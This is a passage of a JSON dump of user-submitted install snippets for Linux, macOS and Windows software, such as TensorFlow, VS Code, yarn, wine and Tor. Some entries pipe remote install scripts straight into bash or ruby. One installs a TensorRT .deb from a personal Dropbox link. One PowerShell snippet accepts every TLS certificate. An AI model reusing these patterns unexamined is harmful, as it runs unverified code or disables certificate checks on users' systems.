    "description": "#Install this package before install teamviewer sudo apt install -y libqt5x11extras5  #Download teamviewer wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb  #Install it sudo apt install ./teamviewer_amd64.deb  #Run it teamviewer\n// GET wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb // INSTALL sudo apt install ./teamviewer_amd64.deb\nwget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb\n",
    "reg_date": "2021-10-11T22:08:45.000Z"
  },
  {
    "id": 3057,
    "keyword": null,
    "link": null,
    "title": " install telnet mac",
    "description": "brew install telnet\n",
    "reg_date": "2021-10-11T22:08:45.000Z"
  },
  {
    "id": 3058,
    "keyword": null,
    "link": null,
    "title": " install tensorflow",
    "description": "######## for Python 2.7 pip install --upgrade pip pip install --upgrade tensorflow  ######## for Python 3.n pip3 install --upgrade pip pip3 install --upgrade tensorflow\npy -m pip install tensorflow # contact me on discord if you need any help deep#3775\npip install tensorflow\n# Requires the latest pip pip install --upgrade pip  # Current stable release for CPU and GPU pip install tensorflow  # Or try the preview build (unstable) pip install tf-nightly \nsudo pip3 install tensorflow\nsudo apt tensorflow\n",
    "reg_date": "2021-10-11T22:08:45.000Z"
  },
  {
    "id": 3059,
    "keyword": null,
    "link": null,
    "title": " install tensorflow anaconda 1",
    "description": "conda install -c conda-forge tensorflow=1.14\n",
    "reg_date": "2021-10-11T22:08:45.000Z"
  },
  {
    "id": 3060,
    "keyword": null,
    "link": null,
    "title": " install tensorrt on colab",
    "description": "#Download TensorRT. [from this link, OR, upload the version you want and replace the file name and dl link here] !wget -O nv-tensorrt-repo-ubuntu1804-cuda10.0-trt5.1.2.2-rc-20190227_1-1_amd64.deb https://www.dropbox.com/s/45pz13r4e8ip4bl/nv-tensorrt-repo-ubuntu1804-cuda10.0-trt5.1.2.2-rc-20190227_1-1_amd64.deb?dl=0 #Install. [rename the .deb file if you donloaded another verion in the 1st and 2nd line below]  !dpkg -i nv-tensorrt-repo-ubuntu1804-cuda10.0-trt5.1.2.2-rc-20190227_1-1_amd64.deb !apt-key add /var/nv-tensorrt-repo-cuda10.0-trt5.1.2.2-rc-20190227/7fa2af80.pub !apt-get update #not sure if these 2 lines are needed, worked without for me. #!apt-get install -y --no-install-recommends libnvinfer5=5.1.2-1+cuda10.0 #!apt-get install -y --no-install-recommends libnvinfer-dev=5.1.2-1+cuda10.0 !apt-get install tensorrt !apt-get install python3-libnvinfer-dev !apt-get install uff-converter-tf #Verify installation. !dpkg -l | grep TensorRT  # i downloaded another version of trt file (cuda11.0-trt7.2.3.4) so for me the output is: ii  graphsurgeon-tf                                             7.2.3-1+cuda11.0                    amd64        GraphSurgeon for TensorRT package ii  libnvinfer-dev                                              8.0.0-1+cuda11.3                    amd64        TensorRT development libraries and headers ii  libnvinfer-plugin-dev                                       8.0.0-1+cuda11.3                    amd64        TensorRT plugin libraries ii  libnvinfer-plugin8                                          8.0.0-1+cuda11.3                    amd64        TensorRT plugin libraries ii  libnvinfer8                                                 8.0.0-1+cuda11.3                    amd64        TensorRT runtime libraries ii  libnvonnxparsers-dev                                        8.0.0-1+cuda11.3                    amd64        TensorRT ONNX libraries ii  libnvonnxparsers8                                           8.0.0-1+cuda11.3                    amd64        TensorRT ONNX libraries ii  libnvparsers-dev                                            8.0.0-1+cuda11.3                    amd64        TensorRT parsers libraries ii  libnvparsers8                                               8.0.0-1+cuda11.3                    amd64        TensorRT parsers libraries ii  python3-libnvinfer                                          8.0.0-1+cuda11.3                    amd64        Python 3 bindings for TensorRT ii  python3-libnvinfer-dev                                      8.0.0-1+cuda11.3                    amd64        Python 3 development package for TensorRT ii  uff-converter-tf                                            7.2.3-1+cuda11.0                    amd64        UFF converter for TensorRT package\n",
    "reg_date": "2021-10-11T22:08:46.000Z"
  },
  {
    "id": 3061,
    "keyword": null,
    "link": null,
    "title": " install terminator in ubuntu",
    "description": "sudo apt install terminator\nsudo add-apt-repository ppa:gnome-terminator\nsudo apt install terminator && sudo update-alternatives --config x-terminal-emulator\n# ubuntu users can install through command line sudo snap install termius-app\n",
    "reg_date": "2021-10-11T22:08:46.000Z"
  },
  {
    "id": 3062,
    "keyword": null,
    "link": null,
    "title": " install terraform ubuntu",
    "description": "# Hashicorp GPG Key curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -  # Hashicorp Linux repository sudo apt-add-repository \"deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main\"  # Update and install sudo apt-get update && sudo apt-get install terraform  # Verify terraform -help  # Tab completion terraform -install-autocomplete\nwget https://releases.hashicorp.com/terraform/0.12.24/terraform_0.12.24_linux_amd64.zip unzip terraform_0.12.24_linux_amd64.zip mv terraform /usr/local/bin/ terraform version# Terraform v0.12.24\n",
    "reg_date": "2021-10-11T22:08:46.000Z"
  },
  {
    "id": 3063,
    "keyword": null,
    "link": null,
    "title": " install three.js",
    "description": "npm install --save three # Or with yarn yarn add three\n",
    "reg_date": "2021-10-11T22:08:46.000Z"
  },
  {
    "id": 3064,
    "keyword": null,
    "link": null,
    "title": " install tkinter",
    "description": "sudo apt-get install python3-tk \n# for pip and windows, in cmd, write: pip install tk\npip3 install tk\npip install tk\nno need to install it. It is usually preinstalled by default. Make sure you write tkinter correctly (with capital letter T on versions less than python 3) while importing\npip install tk  #or pip3 install tk python3 -m pip install tk \n",
    "reg_date": "2021-10-11T22:08:46.000Z"
  },
  {
    "id": 3065,
    "keyword": null,
    "link": null,
    "title": " install tkinter conda",
    "description": "// using conda  conda install -c anaconda tk\n",
    "reg_date": "2021-10-11T22:08:46.000Z"
  },
  {
    "id": 3066,
    "keyword": null,
    "link": null,
    "title": " install tkinter in ubuntu",
    "description": "sudo apt-get update sudo apt install python3-tk\n",
    "reg_date": "2021-10-11T22:08:47.000Z"
  },
  {
    "id": 3067,
    "keyword": null,
    "link": null,
    "title": " install tmux ubuntu",
    "description": "sudo apt-get update sudo apt-get install tmux \n1. Press Command+Space and type Terminal and press enter/return key. 2. Run in Terminal app: ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\" < /dev/null 2> /dev/null # and press enter/return key. # If the screen prompts you to enter a password, please enter your Mac's user password to continue. When you type the password, it won't be displayed on screen, but the system would accept it. So just type your password and press ENTER/RETURN key. Then wait for the command to finish. 3. Run: brew install tmux # Done! You can now use tmux.\n",
    "reg_date": "2021-10-11T22:08:47.000Z"
  },
  {
    "id": 3068,
    "keyword": null,
    "link": null,
    "title": " install to current directory pip",
    "description": "pip install <package-name> -t .\n",
    "reg_date": "2021-10-11T22:08:47.000Z"
  },
  {
    "id": 3069,
    "keyword": null,
    "link": null,
    "title": " install tor browser ubuntu",
    "description": "# Download tor browser launcher sudo add-apt-repository ppa:micahflee/ppa sudo apt update  sudo apt install torbrowser-launcher\n#install sudo add-apt-repository ppa:micahflee/ppa sudo apt update sudo apt install torbrowser-launcher  #launch browser  torbrowser-launcher\nsudo apt install torbrowser-launcher\nBridgeRelay 1  # Replace \"TODO1\" with a Tor port of your choice. # This port must be externally reachable. # Avoid port 9001 because it's commonly associated with Tor and censors may be scanning the Internet for this port. ORPort TODO1  ServerTransportPlugin obfs4 exec /usr/bin/obfs4proxy  # Replace \"TODO2\" with an obfs4 port of your choice. # This port must be externally reachable and must be different from the one specified for ORPort. # Avoid port 9001 because it's commonly associated with Tor and censors may be scanning the Internet for this port. ServerTransportListenAddr obfs4 0.0.0.0:TODO2  # Local communication port between Tor and obfs4.  Always set this to \"auto\". # \"Ext\" means \"extended\", not \"external\".  Don't try to set a specific port number, nor listen on 0.0.0.0. ExtORPort auto  # Replace \"<address@email.com>\" with your email address so we can contact you if there are problems with your bridge. # This is optional but encouraged. ContactInfo <address@email.com>  # Pick a nickname that you like for your bridge.  This is optional. Nickname PickANickname \n",
    "reg_date": "2021-10-11T22:08:47.000Z"
  },
  {
    "id": 3070,
    "keyword": null,
    "link": null,
    "title": " install tor browser ubuntu 20.4",
    "description": "Run the following commands as a user with sudo permissions :  1.Add the Tor browser launcher PPA repository :  sudo add-apt-repository ppa:micahflee/ppa  2.Install the Tor browser launcher package:  sudo apt update  sudo apt install torbrowser-launcher  The Tor browser can be launched either from the command line  by typing torbrowser-launcher or by clicking on the Tor Browser  Launcher icon (Activities -> Tor Browser).  When you start the launcher for the first time, it will download the  Tor browser and all other dependencies.\n",
    "reg_date": "2021-10-11T22:08:47.000Z"
  },
  {
    "id": 3071,
    "keyword": null,
    "link": null,
    "title": " install tqdm",
    "description": "pip install tqdm\nsudo pip3 install tqdm\nfrom tqdm import tqdm for i in tqdm(range(10000)):     pass \n",
    "reg_date": "2021-10-11T22:08:47.000Z"
  },
  {
    "id": 3072,
    "keyword": null,
    "link": null,
    "title": " install traceroute ubuntu 18.04",
    "description": "sudo apt-get install traceroute\n",
    "reg_date": "2021-10-11T22:08:47.000Z"
  },
  {
    "id": 3073,
    "keyword": null,
    "link": null,
    "title": " install tree in linux",
    "description": "apt-get install tree\nsudo apt-get install tree \n",
    "reg_date": "2021-10-11T22:08:48.000Z"
  },
  {
    "id": 3074,
    "keyword": null,
    "link": null,
    "title": " install tweepy",
    "description": "pip install tweepy \n",
    "reg_date": "2021-10-11T22:08:48.000Z"
  },
  {
    "id": 3075,
    "keyword": null,
    "link": null,
    "title": " install ufw centos",
    "description": "sudo yum install epel-release -y sudo yum install --enablerepo=\"epel\" ufw -y #after install it, enable ufw sudo ufw enable  #check ufw status sudo ufw status\n",
    "reg_date": "2021-10-11T22:08:48.000Z"
  },
  {
    "id": 3076,
    "keyword": null,
    "link": null,
    "title": " install unity in ubuntu",
    "description": "sudo apt install ubuntu-unity-desktop\n",
    "reg_date": "2021-10-11T22:08:48.000Z"
  },
  {
    "id": 3077,
    "keyword": null,
    "link": null,
    "title": " install uvicorn",
    "description": "pip install uvicorn\nuvicorn main:app\n",
    "reg_date": "2021-10-11T22:08:48.000Z"
  },
  {
    "id": 3078,
    "keyword": null,
    "link": null,
    "title": " install vi editor ubuntu dockerfile",
    "description": "apt-get update apt-get install vim\n",
    "reg_date": "2021-10-11T22:08:48.000Z"
  },
  {
    "id": 3079,
    "keyword": null,
    "link": null,
    "title": " install vim",
    "description": "#Ubuntu or Debian sudo apt install -y vim\nsudo apt-get install vim   \nWant to download Vim 8.2 for Windows?  Go to the appropriate link: \t-Windows 64-bit:     \thttps://github.com/vim/vim-win32-installer/releases/download/v8.2.2875/gvim_8.2.2875_x64_signed.exe     -Windows 32-bit:     \thttps://github.com/vim/vim-win32-installer/releases/download/v8.2.2875/gvim_8.2.2875_x86_signed.exe  Download and run the appropriate files!\nbrew install vim \nLinux (Red Hat based): sudo yum install vim Linux (Debian based): sudo apt-get install vim Linux (Arch Based): sudo pacman -S vim Windows: Just copy and paste this link on your browser... This is the official ftp mirror https://ftp.nluug.nl/pub/vim/pc/gvim82.exe MacOS (using brew): brew install vim\ngit clone https://github.com/vim/vim.git cd vim/src make \n",
    "reg_date": "2021-10-11T22:08:48.000Z"
  },
  {
    "id": 3080,
    "keyword": null,
    "link": null,
    "title": " install vinagre ubuntu",
    "description": "$ sudo apt-get update -y $ sudo apt-get install -y vinagre\n",
    "reg_date": "2021-10-11T22:08:48.000Z"
  },
  {
    "id": 3081,
    "keyword": null,
    "link": null,
    "title": " install virtualenv",
    "description": "pip install virtualenv  activate it by doing this: cd myproject/Scripts/activate\npython3 -m venv env python -m virtualenv env #py2  source env/bin/activate  #all this is on same directory \npip install virtualenv cd projectfolder #go to project folder virtualenv projectname #create the folder projectname  source projectname/bin/activate\npip install virtualenv # install first cd projectfolder # go to project folder python -m venv ./venv # Create a virtual environment named venv Activate.ps1 # (powershell) start the file  to start the environment activate.bat # (cmd) start the file  to start the environment # if it worked you'll see a (venv) in front of your cursor path\n # ------- How to use a virtual environment on MAC? -------- # # Use the command line to:   1&ordm; - Instal Python3 and pip3        2&ordm; - Create a folder for your virtual environment:     >> cd \"path_to_the_place_you_want_to_locate_your_folder\"      >> python3 -m venv \"name_of_env\"        3&ordm; - Activate this virtual environment:    >> source \"name_of_env\"/bin/activate        4&ordm; - Now you can install new things inside this environment:      >> pip3 install django  # for example   \npython3 -m venv env \n",
    "reg_date": "2021-10-11T22:08:49.000Z"
  },
  {
    "id": 3082,
    "keyword": null,
    "link": null,
    "title": " install visual studio code ubuntu",
    "description": "wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\" sudo apt update sudo apt install code\n//Step 1:  sudo apt update sudo apt install software-properties-common apt-transport-https wgetCopyCopy //Step 2: wget -q https://packages.microsoft.com/keys/microsoft.asc -O-| sudo apt-key add - //Step 3: sudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\" //Step 4 sudo apt install code.   \nsudo snap install --classic code\nsudo snap install authy\nsudo snap install code --classic\nwget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/trusted.gpg.d/ sudo sh -c 'echo \"deb [arch=amd64,arm64,armhf signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main\" > /etc/apt/sources.list.d/vscode.list' rm -f packages.microsoft.gpg\n",
    "reg_date": "2021-10-11T22:08:49.000Z"
  },
  {
    "id": 3083,
    "keyword": null,
    "link": null,
    "title": " install vlc in ubuntu 20.04 terminal",
    "description": "$ sudo apt install vlc  \n",
    "reg_date": "2021-10-11T22:08:49.000Z"
  },
  {
    "id": 3084,
    "keyword": null,
    "link": null,
    "title": " install vlc on ubuntu",
    "description": "# Ubuntu 20.04 upwards sudo apt install snapd sudo snap install vlc\n% sudo snap install vlc \nsudo apt install vlc\nsudo apt install vlc \n% sudo snap install vlc\n",
    "reg_date": "2021-10-11T22:08:49.000Z"
  },
  {
    "id": 3085,
    "keyword": null,
    "link": null,
    "title": " install vlc on ubuntu 20.04",
    "description": "$ sudo apt install vlc  \nsudo snap install vlcCopy\n",
    "reg_date": "2021-10-11T22:08:49.000Z"
  },
  {
    "id": 3086,
    "keyword": null,
    "link": null,
    "title": " install vm guest additions ubuntu",
    "description": "sudo apt-get install virtualbox-guest-additions-iso \n",
    "reg_date": "2021-10-11T22:08:50.000Z"
  },
  {
    "id": 3087,
    "keyword": null,
    "link": null,
    "title": " install vmware tools from terminal",
    "description": "sudo apt install open-vm-tools-desktop\nsudo apt updatesudo apt install open-vm-tools-desktop\nsudo apt updatesudo apt install open-vm-tools\n",
    "reg_date": "2021-10-11T22:08:50.000Z"
  },
  {
    "id": 3088,
    "keyword": null,
    "link": null,
    "title": " install vmware tools ubuntu",
    "description": "sudo apt install open-vm-tools-desktop\n# install open-vmware-tools-desktop for the desktop version, otherwise  # copy-paste between host and VM will not work: sudo apt install open-vm-tools-desktop  # for the server version use sudo apt install open-vm-tools\nDownload vmware from official site for linux Then cd into the downloads folder by cd Downloads/ Then $ sudo apt update && sudo apt upgrade $ chmod VMware-Workstation-Full-16.1.0-17198959.x86_64.bundle $ sudo ./VMware-Workstation-Full-16.1.0-17198959.x86_64.bundle $ sudo apt update && sudo apt upgrade $ sudo apt-get install build-essential module-assistant $ sudo m-a prepare  Then open vmware Then click on install  Enter your password  It will be installed\nsudo apt updatesudo apt install open-vm-tools-desktop\nsudo apt updatesudo apt install open-vm-tools\nHow to install Ubuntu 16.04 in VMware Workstation  Step 01: Create a New Virtual Machine Step 02: Select Hardware Compatibility Step 03: Use or select Ubuntu 16.04 Image to install Step 04: Configure Virtual Machine Name and file Location Step 05: Configure Virtual processor for new virtual machine Step 06: Setup Virtual RAM memory for new virtual machine Step 07: Setup Virtual Machine Network  Step 08: Configure Virtual storage disk for new virtual machine Step 09: Now power on of the virtual machine after finish the VMware setup Step 10: Get the Ubuntu setup screen on display  follow the given instruction on screen and it will install in 10 min. \n",
    "reg_date": "2021-10-11T22:08:50.000Z"
  },
  {
    "id": 3089,
    "keyword": null,
    "link": null,
    "title": " install vnc linux mint mate",
    "description": "#1. Remove the default Vino server: sudo apt-get -y remove vino  #2. Install x11vnc: sudo apt-get -y install x11vnc  #3. Create the directory for the password file: sudo mkdir /etc/x11vnc  #4. Create the encrypted password file: sudo x11vnc --storepasswd /etc/x11vnc/vncpwd  #You will be asked to enter and verify the password.  Then press Y to save the password file.  #5. Create the systemd service file for the x11vnc service: sudo xed /lib/systemd/system/x11vnc.service  #Copy/Paste this code into the empty file:  [Unit] Description=Start x11vnc at startup. After=multi-user.target  [Service] Type=simple ExecStart=/usr/bin/x11vnc -auth guess -forever -noxdamage -repeat -rfbauth /etc/x11vnc/vncpwd -rfbport 5900 -shared  [Install] WantedBy=multi-user.target  #6: Reload the services: sudo systemctl daemon-reload  #7. Enable the x11vnc service at boot time: sudo systemctl enable x11vnc.service  #8. Start the service: #Either reboot or sudo systemctl start x11vnc.service\n",
    "reg_date": "2021-10-11T22:08:50.000Z"
  },
  {
    "id": 3090,
    "keyword": null,
    "link": null,
    "title": " install vs code in ubuntu",
    "description": "wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\" sudo apt update sudo apt install code\n//Step 1:  sudo apt update sudo apt install software-properties-common apt-transport-https wgetCopyCopy //Step 2: wget -q https://packages.microsoft.com/keys/microsoft.asc -O-| sudo apt-key add - //Step 3: sudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\" //Step 4 sudo apt install code.   \nsudo snap install --classic code\nsudo snap install authy\nwget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/trusted.gpg.d/ sudo sh -c 'echo \"deb [arch=amd64,arm64,armhf signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main\" > /etc/apt/sources.list.d/vscode.list' rm -f packages.microsoft.gpg\nsudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\"\n",
    "reg_date": "2021-10-11T22:08:50.000Z"
  },
  {
    "id": 3091,
    "keyword": null,
    "link": null,
    "title": " install vscode centos 7",
    "description": "sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc sudo nano /etc/yum.repos.d/vscode.repo \t[code] \tname=Visual Studio Code \tbaseurl=https://packages.microsoft.com/yumrepos/vscode \tenabled=1 \tgpgcheck=1 \tgpgkey=https://packages.microsoft.com/keys/microsoft.asc sudo yum install code sudo yum update \n",
    "reg_date": "2021-10-11T22:08:51.000Z"
  },
  {
    "id": 3092,
    "keyword": null,
    "link": null,
    "title": " install vscode for ubuntu",
    "description": "sudo snap install --classic code\n",
    "reg_date": "2021-10-11T22:08:51.000Z"
  },
  {
    "id": 3093,
    "keyword": null,
    "link": null,
    "title": " install vscode ubuntu 20.04",
    "description": "sudo snap install --classic code\nsudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\"\n",
    "reg_date": "2021-10-11T22:08:51.000Z"
  },
  {
    "id": 3094,
    "keyword": null,
    "link": null,
    "title": " install vscode ubuntu command line",
    "description": "wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\" sudo apt update sudo apt install code\nsudo snap install --classic code\nwget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/trusted.gpg.d/ sudo sh -c 'echo \"deb [arch=amd64,arm64,armhf signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main\" > /etc/apt/sources.list.d/vscode.list' rm -f packages.microsoft.gpg\nsudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\"\n",
    "reg_date": "2021-10-11T22:08:51.000Z"
  },
  {
    "id": 3095,
    "keyword": null,
    "link": null,
    "title": " install vue in laravel",
    "description": "$ composer require laravel/ui\n$ php artisan ui vue --auth \nphp artisan ui vue\n$ php artisan ui vue\n$ php artisan ui vue --auth\n window.Vue = require('vue');  Vue.component('example-component', require('./components/ExampleComponent.vue').default);  const app = new Vue({    el: '#app',  }); \n",
    "reg_date": "2021-10-11T22:08:51.000Z"
  },
  {
    "id": 3096,
    "keyword": null,
    "link": null,
    "title": " install vue js ubuntu",
    "description": "npm install vue\n# latest stable $ npm install vue@next \n",
    "reg_date": "2021-10-11T22:08:51.000Z"
  },
  {
    "id": 3097,
    "keyword": null,
    "link": null,
    "title": " install vue router",
    "description": "npm install vue-router \n//Installing Vue Router npm install vue-router  //Implementation //main.js - Add below lines import VueRouter from 'vue-router';  Vue.use(VueRouter);  const router = new VueRouter({   routes,   mode: 'history' });  new Vue({   router,   render: h => h(App) }).$mount('#app')  //App.vue - Add below line in v-content /* <template>   <v-app>     <v-content>       <router-view></router-view>     </v-content>   </v-app> </template> */  //route.js - We need to craate file under src import linkName from './components/fileName.vue'; export const routes = [   {     path: '/',     component: linkName   } ]\nnpm install --save vue-router@next  # Install the latest version\nimport Vue from 'vue' import VueRouter from 'vue-router'  Vue.use(VueRouter) \ncd [project] npm install --save vue-router // install only on the project that we are in\nnpm install vue-router\n",
    "reg_date": "2021-10-11T22:08:52.000Z"
  },
  {
    "id": 3098,
    "keyword": null,
    "link": null,
    "title": " install vuex",
    "description": "npm install vuex --save  // then in your store.js import Vue from 'vue' import Vuex from 'vuex'  Vue.use(Vuex);\nnpm install vuex --save \n$ npm install vue vuex @vuex-orm/core --save \nimport Vue from 'vue' import Vuex from 'vuex'  Vue.use(Vuex) \n",
    "reg_date": "2021-10-11T22:08:52.000Z"
  },
  {
    "id": 3099,
    "keyword": null,
    "link": null,
    "title": " install webmin ubuntu 20.04",
    "description": "$ sudo apt update $ sudo nano /etc/apt/sources.list  $ sudo nano /etc/apt/sources.list . . . deb http://download.webmin.com/download/repository sarge contrib . . .  $ wget -q -O- http://www.webmin.com/jcameron-key.asc | sudo apt-key add $ sudo apt update $ sudo apt install webmin $ sudo ufw allow 10000 #open it from https://your_domain:10000 \nsudo systemctl status webmin \nsudo apt install webmin \n",
    "reg_date": "2021-10-11T22:08:52.000Z"
  },
  {
    "id": 3100,
    "keyword": null,
    "link": null,
    "title": " install webpack",
    "description": "npm install --save-dev webpack # or specific version npm install --save-dev webpack@<version>\nnpm install --save-dev webpack-cli\nnpm install --save-dev webpack\nnpm install webpack webpack-cli --save-dev\nnpm install --save-dev webpack\nnpm i npm-install-webpack-plugin\n",
    "reg_date": "2021-10-11T22:08:52.000Z"
  },
  {
    "id": 3101,
    "keyword": null,
    "link": null,
    "title": " install webpack cli",
    "description": "npm install --save-dev webpack-cli\nnpm install --save-dev webpack\n",
    "reg_date": "2021-10-11T22:08:53.000Z"
  },
  {
    "id": 3102,
    "keyword": null,
    "link": null,
    "title": " install wget",
    "description": "sudo yum install wget\napt-get install wget\nwget link\n#you can perform similar to wget with this command in powershell, accept all certs in test mode  $client = new-object System.Net.WebClient  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;  $client.DownloadString(\"https://url-url-here\")\n",
    "reg_date": "2021-10-11T22:08:53.000Z"
  },
  {
    "id": 3103,
    "keyword": null,
    "link": null,
    "title": " install wget debian",
    "description": "apt-get install wget\n",
    "reg_date": "2021-10-11T22:08:53.000Z"
  },
  {
    "id": 3104,
    "keyword": null,
    "link": null,
    "title": " install wheel",
    "description": "pip install wheel \n",
    "reg_date": "2021-10-11T22:08:53.000Z"
  },
  {
    "id": 3105,
    "keyword": null,
    "link": null,
    "title": " install windows service application on windows server",
    "description": "\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\installutil.exe\" \"c:\\myservice.exe\" \nSC CREATE \"MySVC\" binpath= \"D:\\Me\\Services\\MySVC\\MySVC.exe\"\n",
    "reg_date": "2021-10-11T22:08:53.000Z"
  },
  {
    "id": 3106,
    "keyword": null,
    "link": null,
    "title": " install wine ubuntu",
    "description": "#Install trough Ubuntu libraries sudo apt install wine64\n# Add wine key wget -nc https://dl.winehq.org/wine-builds/winehq.key sudo apt-key add winehq.key  # Add repository  sudo add-apt-repository 'deb https://dl.winehq.org/wine-builds/ubuntu/ focal main'  # Update packages  sudo apt update  # Install wine  sudo apt install --install-recommends winehq-stable \nsudo apt update sudo apt install wine64\nsudo apt-get install libgnutls30:i386 libldap-2.4-2:i386 libgpg-error0:i386 libxml2:i386 libasound2-plugins:i386 libsdl2-2.0-0:i386 libfreetype6:i386 libdbus-1-3:i386 libsqlite3-0:i386\n$ sudo dpkg --add-architecture i386\n$ wget -qO- https://dl.winehq.org/wine-builds/Release.key | sudo apt-key add -\n",
    "reg_date": "2021-10-11T22:08:53.000Z"
  },
  {
    "id": 3107,
    "keyword": null,
    "link": null,
    "title": " install wine ubuntu 20.04",
    "description": "$ sudo apt install wine64 wine32 \n",
    "reg_date": "2021-10-11T22:08:53.000Z"
  },
  {
    "id": 3108,
    "keyword": null,
    "link": null,
    "title": " install wireguard",
    "description": "$ sudo add-apt-repository ppa:wireguard/wireguard $ sudo apt-get update $ sudo apt-get install wireguard \nsudo apt install wireguard\n",
    "reg_date": "2021-10-11T22:08:54.000Z"
  },
  {
    "id": 3109,
    "keyword": null,
    "link": null,
    "title": " install wireshark on ubuntu",
    "description": "$ sudo apt update $ sudo apt install wireshark $ sudo usermod -aG wireshark $(whoami) $ sudo reboot\n$ sudo apt install wireshark\n",
    "reg_date": "2021-10-11T22:08:54.000Z"
  },
  {
    "id": 3110,
    "keyword": null,
    "link": null,
    "title": " install workbench on ubuntu",
    "description": "snap install mysql-workbench-community apt install mysql-workbench\n",
    "reg_date": "2021-10-11T22:08:54.000Z"
  },
  {
    "id": 3111,
    "keyword": null,
    "link": null,
    "title": " install wps ubuntu",
    "description": "sudo snap install wps-office-multilang\n",
    "reg_date": "2021-10-11T22:08:54.000Z"
  },
  {
    "id": 3112,
    "keyword": null,
    "link": null,
    "title": " install wps ubuntu 20.04",
    "description": "sudo snap install wps-office-multilang\n",
    "reg_date": "2021-10-11T22:08:54.000Z"
  },
  {
    "id": 3113,
    "keyword": null,
    "link": null,
    "title": " install wps ubuntu 20.04 multilanguage",
    "description": "sudo snap install wps-office-multilang\n",
    "reg_date": "2021-10-11T22:08:54.000Z"
  },
  {
    "id": 3114,
    "keyword": null,
    "link": null,
    "title": " install xcode tools using brew",
    "description": "xcode-select --install \n",
    "reg_date": "2021-10-11T22:08:54.000Z"
  },
  {
    "id": 3115,
    "keyword": null,
    "link": null,
    "title": " install xdotool ubuntu",
    "description": "\tsudo apt-get update     sudo apt-get install xdotool\n",
    "reg_date": "2021-10-11T22:08:55.000Z"
  },
  {
    "id": 3116,
    "keyword": null,
    "link": null,
    "title": " install xfce",
    "description": "sudo apt install xfce4 \n",
    "reg_date": "2021-10-11T22:08:55.000Z"
  },
  {
    "id": 3117,
    "keyword": null,
    "link": null,
    "title": " install yacc on ubuntu",
    "description": "sudo apt-get install bison flex \n",
    "reg_date": "2021-10-11T22:08:55.000Z"
  },
  {
    "id": 3118,
    "keyword": null,
    "link": null,
    "title": " install yarn global",
    "description": "npm install --global yarn \nnpm install --global yarn\nyarn global <add/bin/list/remove/upgrade> [--prefix]\n",
    "reg_date": "2021-10-11T22:08:55.000Z"
  },
  {
    "id": 3119,
    "keyword": null,
    "link": null,
    "title": " install yarn globally",
    "description": "npm install --global yarn \nbrew install yarn \nbrew install yarn\ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list \n",
    "reg_date": "2021-10-11T22:08:55.000Z"
  },
  {
    "id": 3120,
    "keyword": null,
    "link": null,
    "title": " install yarn in mac",
    "description": "brew install yarn \ncurl -o- -L https://yarnpkg.com/install.sh | bash \ncurl -o- -L https://yarnpkg.com/install.sh | bash\nbrew install yarn\n",
    "reg_date": "2021-10-11T22:08:56.000Z"
  },
  {
    "id": 3121,
    "keyword": null,
    "link": null,
    "title": " install yarn in react native",
    "description": "npm install -g yarn yarn global add react-native-cli react-native init sample\n",
    "reg_date": "2021-10-11T22:08:56.000Z"
  },
  {
    "id": 3122,
    "keyword": null,
    "link": null,
    "title": " install yarn on windows",
    "description": "npm install --global yarn \nbrew install yarn\nnpm install --global yarn   and   https://classic.yarnpkg.com/latest.msi\nFor Windows you can also install with: choco install yarn\n",
    "reg_date": "2021-10-11T22:08:56.000Z"
  },
  {
    "id": 3123,
    "keyword": null,
    "link": null,
    "title": " install yarn ubuntu 20.04",
    "description": "sudo apt update sudo apt install yarn\nsudo apt install --no-install-recommends yarn\n#Yarn versions prior to 2.0. Install via npm (recommended). #may require sudo npm install --global yarn #Yarn 2 and later may require sudo npm install -g yarn #Check installation yarn --version\nHow to Install Yarn on Ubuntu 20.04 | Linuxize sudo apt update sudo apt install yarn\n",
    "reg_date": "2021-10-11T22:08:56.000Z"
  },
  {
    "id": 3124,
    "keyword": null,
    "link": null,
    "title": " install youtube-dl in ubuntu",
    "description": "$ sudo apt-get install youtube-dl\nsudo add-apt-repository ppa:nilarimogard/webupd8 sudo apt-get update && sudo apt-get install youtube-dlg\n",
    "reg_date": "2021-10-11T22:08:56.000Z"
  },
  {
    "id": 3125,
    "keyword": null,
    "link": null,
    "title": " install youtube-dl windows",
